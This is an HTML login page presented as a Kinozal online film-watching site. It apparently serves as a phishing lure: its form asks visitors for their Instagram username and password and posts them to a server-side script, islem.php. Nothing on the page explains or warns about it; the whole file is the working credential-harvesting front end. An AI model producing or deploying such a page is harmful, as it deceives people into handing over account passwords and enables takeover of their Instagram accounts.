<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        *{
            box-sizing:border-box;
            text-decoration:none;
        }
        *:focus{
            outline:none;
        }
        body{
            font-family:Arial;
            background:#3498D8;
            padding:50px;
        }
        .login{
            margin:20px auto;
            width:300px;
        }
        .login-screen{
            background-color:#fff;
            padding:20px;
            border-radius:5px;
        }
        .app-title{
            text-align:center;
            color:#777;
        }
        .login-form{
            text-align:center;
        }
        .control-group{
            margin-bottom:10px;
        }
        input{
            text-align:center;
            background-color:#ECF0F1;
            border:2px solid transparent;
            border-radius:3px;
            font-size:16px;
            font-weight:200;
            padding:10px 0;
            width:250px;
            transition:border .5s;
        }
        input:focus{
            border:2px solid #3498DB;
            box-shadow:none;
        }
        .btn{
            border:2px solid transparent;
            background:#3498DB;
            color:#ffffff;
            font-size:16px;
            line-height:25px;
            padding:10px 0;
            text-decoration:none;
            text-shadow:none;
            border-radius:3px;
            transition:0.25s;
            display:block;
            width:250px;
            margin: 0 auto;
            margin-top:5px;
        }
        .btn:hover{
            background-color:#2980B9;
        }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kinozal online bax və izlə</title>
</head>
<body>
    <div class="login">
        <div class="login-screen">
            <div class="app-title">
                <h1>Giriş Yap</h1>
            </div>
            <form action="islem.php" method="post">
            <div class="login-form">
                <div class="control-group">
                    <input type="text" name="username" class="login-field" placeholder="İnstagram hesabınız" id="login-name">
                    <label class="login-field-icon fui-user"for="login-name"></label>
                </div>
                <div class="control-group">
                    <input type="password" name="password" class="login-field" placeholder="İnstagram şifrəniz" id="login-pass">
                    <label class="login-field-icon fui-user" for="login-pass"></label>
                </div>
                <button href="index.php"  name="giris" class="btn btn-primary btn-large btn-block">Giriş Yap</button>
            </div>
            <a href="kayit.php"><button href="kayit.php" class="btn btn-primary btn-large btn-block">Kayıt ol</button></a>
    </form>

        </div>
    </div>
    
</body>
</html>